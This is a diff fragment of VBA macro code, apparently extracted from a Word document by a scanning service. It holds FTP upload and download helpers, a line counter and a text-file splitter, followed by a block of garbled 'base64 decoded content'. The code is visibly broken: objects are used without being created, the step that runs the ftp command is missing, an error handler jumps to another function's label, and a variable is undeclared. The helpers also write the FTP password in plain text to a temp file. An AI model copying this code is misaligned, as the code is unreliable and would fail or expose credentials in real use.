+        FailedReason = ""
+    ElseIf InStr(sResults, "File not found") > 0 Then
+        FailedReason = "Error: File Not Found"
+    ElseIf InStr(sResults, "cannot log in.") > 0 Then
+        FailedReason = "Error: Login Failed."
+    Else
+        FailedReason = "Error: Unknown."
+    End If
+    
+    
+    oFTPScriptFSO.DeleteFile (sFTPTempFile)
+    oFTPScriptFSO.DeleteFile (sFTPResults)
+    
+    Set oFTPScriptFSO = Nothing
+    
+    oFTPScriptShell.CurrentDirectory = sOriginalWorkingDirectory
+    Set oFTPScriptShell = Nothing
+    
+    
+Exit_FTPUpload:
+    FTPUpload = FailedReason
+    Exit Function
+    
+Err_FTPUpload:
+    FailedReason = Err.Description
+    Resume Exit_FTPDownload
+    
+End Function
+
+'Ftp download file
+Function FTPDownload(Site, sUsername, sPassword, sLocalPath, sRemotePath, sRemoteFile, Optional Delay As Integer = 1000) As String
+    On Error GoTo Err_FTPDownload
+    
+    Dim FailedReason As String
+    
+    Dim oFTPScriptFSO As Object
+    Dim oFTPScriptShell As Object
+
+    
+    
+    sRemotePath = Trim(sRemotePath)
+    sLocalPath = Trim(sLocalPath)
+    
+    '----------Path Checks---------
+    If InStr(sRemotePath, " ") > 0 Then
+        If Left(sRemotePath, 1) <> """" And Right(sRemotePath, 1) <> """" Then
+            sRemotePath = """" & sRemotePath & """"
+        End If
+    End If
+    
+    
+    If Len(sRemotePath) = 0 Then
+        sRemotePath = "\"
+    End If
+    
+    
+    'If the local path was blank. Pass the current working direcory.
+    If Len(sLocalPath) = 0 Then
+        sLocalPath = oFTPScriptShell.CurrentDirectory
+    End If
+    
+    
+    If Not oFTPScriptFSO.FolderExists(sLocalPath) Then
+        'destination not found
+        FailedReason = "Error: Local Folder Not Found."
+        GoTo Exit_FTPDownload
+    End If
+    
+    
+    Dim sOriginalWorkingDirectory As String
+    sOriginalWorkingDirectory = oFTPScriptShell.CurrentDirectory
+    oFTPScriptShell.CurrentDirectory = sLocalPath
+    '--------END Path Checks---------
+    
+    'build input file for ftp command
+    Dim sFTPScript As String
+    sFTPScript = ""
+    
+    sFTPScript = sFTPScript & "USER " & sUsername & vbCrLf
+    sFTPScript = sFTPScript & sPassword & vbCrLf
+    sFTPScript = sFTPScript & "cd " & sRemotePath & vbCrLf
+    sFTPScript = sFTPScript & "binary" & vbCrLf
+    sFTPScript = sFTPScript & "prompt n" & vbCrLf
+    sFTPScript = sFTPScript & "mget " & sRemoteFile & vbCrLf
+    sFTPScript = sFTPScript & "quit" & vbCrLf & "quit" & vbCrLf & "quit" & vbCrLf
+    
+    
+    Dim sFTPTemp As String
+    Dim sFTPTempFile As String
+    Dim sFTPResults As String
+    
+    sFTPTemp = oFTPScriptShell.ExpandEnvironmentStrings("%TEMP%")
+    sFTPTempFile = sFTPTemp & "\" & oFTPScriptFSO.GetTempName
+    sFTPResults = sFTPTemp & "\" & oFTPScriptFSO.GetTempName
+    
+    'Write the input file for the ftp command to a temporary file.
+    Dim fFTPScript As Object
+    Set fFTPScript = oFTPScriptFSO.CreateTextFile(sFTPTempFile, True)
+    
+    fFTPScript.WriteLine (sFTPScript)
+    fFTPScript.Close
+    
+    Set fFTPScript = Nothing
+    
+    
+
+
+    
+    'Check results of transfer.
+    Dim fFTPResults As Object
+    Dim sResults As String
+    
+    Const OpenAsDefault = -2
+    Const FailIfNotExist = 0
+    Const ForReading = 1
+    Const ForWriting = 2
+    
+    Set fFTPResults = oFTPScriptFSO.OpenTextFile(sFTPResults, ForReading, FailIfNotExist, OpenAsDefault)
+    sResults = fFTPResults.ReadAll
+    fFTPResults.Close
+    
+    
+    If InStr(sResults, "226 Transfer complete.") > 0 Then
+        FailedReason = ""
+    ElseIf InStr(sResults, "File not found") > 0 Then
+        FailedReason = "Error: File Not Found"
+    ElseIf InStr(sResults, "cannot log in.") > 0 Then
+        FailedReason = "Error: Login Failed."
+    Else
+        FailedReason = "Error: Unknown."
+    End If
+    
+    
+    oFTPScriptFSO.DeleteFile (sFTPTempFile)
+    oFTPScriptFSO.DeleteFile (sFTPResults)
+    
+    Set oFTPScriptFSO = Nothing
+    
+
+    
+    
+Exit_FTPDownload:
+    FTPDownload = FailedReason
+    Exit Function
+    
+Err_FTPDownload:
+    FailedReason = Err.Description
+    Resume Exit_FTPDownload
+    
+End Function
+
+'Count Row Number of a text file
+Public Function CountRowsInText(file_name As String) As Long
+    On Error GoTo Err_CountRowsInText
+    
+    Dim fso As Object
+    Dim File As Object
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set File = fso.OpenTextFile(file_name, 1)
+
+
+    Dim RowCnt As Long
+    Dim str_line As String
+    
+    RowCnt = 0
+
+    Do Until File.AtEndOfStream = True
+        RowCnt = RowCnt + 1
+        str_line = File.ReadLine
+        
+    Loop
+
+
+    File.Close
+
+
+Exit_CountRowsInText:
+    CountRowsInText = RowCnt
+    Exit Function
+
+Err_CountRowsInText:
+    RowCnt = -1
+    Call ShowMsgBox(Err.Description)
+    Resume Exit_CountRowsInText
+
+End Function
+
+'Split a Text File into multiple text files of specified row count(default: 65535)
+Public Function SplitTextFile(src As String, Optional des_fmt As String, Optional RowCntPerFile As Long = 65535, Optional file_idx_start As Integer = 0, Optional NumOfHdrRows As Long = 0, Optional DeleteSrc As Boolean = False) As String
+    On Error GoTo Err_SplitTextFile
+    
+    Dim FailedReason As String
+
+
+    If Len(Dir(src)) = 0 Then
+        FailedReason = src
+        GoTo Exit_SplitTextFile
+    End If
+
+    If RowCntPerFile < NumOfHdrRows + 1 Then
+        FailedReason = "RowCntPerFile < NumOfHdrRows + 1"
+        GoTo Exit_SplitTextFile
+    End If
+
+
+    'if no need to split, return
+    Dim RowCnt_src As Long
+    RowCnt_src = CountRowsInText(src)
+    
+    If RowCnt_src <= RowCntPerFile Then
+        GoTo Exit_SplitTextFile
+    End If
+    
+    
+    'Check whether there exists files which name is same to the splitted files
+    Dim fso As Object
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    Dim des_dir As String
+    Dim des_name As String
+    Dim des_ext As String
+    Dim des_path As String
+    
+    des_dir = fso.GetParentFolderName(src)
+    des_name = fso.GetFileName(src)
+    des_ext = fso.GetExtensionName(src)
+
+    If des_fmt = "" Then
+        des_fmt = Left(des_name, Len(des_name) - Len("." & des_ext)) & "_*"
+    End If
+
+    
+    Dim NumOfSplit As Integer
+    
+    If RowCnt_src <= RowCntPerFile Then
+        NumOfSplit = 0
+    Else
+        NumOfSplit = Int((RowCnt_src - RowCntPerFile) / (RowCntPerFile + 1 - NumOfHdrRows)) + 1
+    End If
+    
+    
+    Dim file_idx_end As Integer
+    file_idx_end = file_idx_start + NumOfSplit 'Int(RowCnt_src / (RowCntPerFile + 1 - NumOfHdrRows))
+    
+    
+    Dim file_idx As Integer
+    
+    For file_idx = file_idx_start To file_idx_end
+        des_path = des_dir & "\" & Replace(des_fmt, "*", Str(file_idx)) & "." & des_ext
+        
+        If Len(Dir(des_path)) > 0 Then
+            Exit For
+        End If
+        
+    Next file_idx
+    
+    
+    If Len(Dir(des_path)) > 0 Then
+        FailedReason = des_path
+        GoTo Exit_SplitTextFile
+    End If
+    
+    
+    
+    'Obtain header rows for later files and create the first splitted file
+    Dim File_src As Object
+    Dim FileNum_des As Integer
+    Dim str_line As String
+    Dim HdrRows As String
+
+    Set File_src = fso.OpenTextFile(src, 1)
+    des_path = des_dir & "\" & Replace(des_fmt, "*", Str(file_idx_start)) & "." & des_ext
+    FileNum_des = FreeFile
+    Open des_path For Output As #FileNum_des
+    
+    RowCnt = 0
+    
+    Do Until RowCnt >= NumOfHdrRows Or File_src.AtEndOfStream = True
+        RowCnt = RowCnt + 1
+        str_line = File_src.ReadLine
+        Print #FileNum_des, str_line
+        HdrRows = HdrRows & str_line
+        
+    Loop
+
+    
+    Do Until RowCnt >= RowCntPerFile Or File_src.AtEndOfStream = True
+        RowCnt = RowCnt + 1
+        Print #FileNum_des, File_src.ReadLine
+        
+    Loop
+    
+    Close #FileNum_des
+    
+
+    'Start to split
+    For file_idx = file_idx_start + 1 To file_idx_end
+        If File_src.AtEndOfStream = True Then
+            Exit For
+        End If
+            
+        des_path = des_dir & "\" & Replace(des_fmt, "*", Str(file_idx)) & "." & des_ext
+        FileNum_des = FreeFile
+        Open des_path For Output As #FileNum_des
+
+        RowCnt = NumOfHdrRows
+        Print #FileNum_des, HdrRows
+
+        Do Until RowCnt >= RowCntPerFile Or File_src.AtEndOfStream = True
+            RowCnt = RowCnt + 1
+            Print #FileNum_des, File_src.ReadLine
+            
+        Loop
+
+        Close #FileNum_des
+        
+    Next file_idx
+
+    
+    File_src.Close
+
+
+    If DeleteSrc = True Then
+        Kill src
+    End If
+    
+    
+Exit_SplitTextFile:
+    SplitTextFile = FailedReason
+    Exit Function
+
+Err_SplitTextFile:
+    FailedReason = Err.Description
+    Resume Exit_SplitTextFile
+    
+End Function
+
+
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+' InQuest injected base64 decoded content
+' INL	
+' 67	\
+' S=AL
+' H'$.89
+' *G^/CG
+' _&6,34
+' =AD9TA
+' Y< ;5.8
+' 0)	X
+' =ASE%
+' R/CG
+' _&6,34GME
+' MER 
+
+INQUEST-PP=macro
